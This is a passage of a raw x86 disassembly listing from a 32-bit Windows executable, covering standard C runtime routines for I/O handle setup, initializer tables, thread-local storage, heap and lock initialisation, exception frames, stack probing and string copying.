  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
